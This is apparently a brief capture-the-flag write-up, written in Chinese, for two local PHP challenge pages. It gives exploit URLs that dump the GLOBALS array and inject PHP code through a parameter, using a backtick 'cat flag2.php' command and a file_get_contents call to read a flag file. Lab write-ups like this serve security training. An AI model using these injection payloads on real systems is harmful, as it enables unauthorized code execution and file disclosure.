
## writeUp 

### index1.php

利用超全局变量GLOBALS
```
http://127.0.0.1/web1/index1.php?args=GLOBALS
```

### index2.php 

利用命令注入;
```
http://127.0.0.1/web1/index2.php?hello=1);echo `cat flag2.php`;//
```
另一种利用方法:
```
http://127.0.0.1/web1/index2.php?hello=file_get_contents(%27flag2.php%27)
```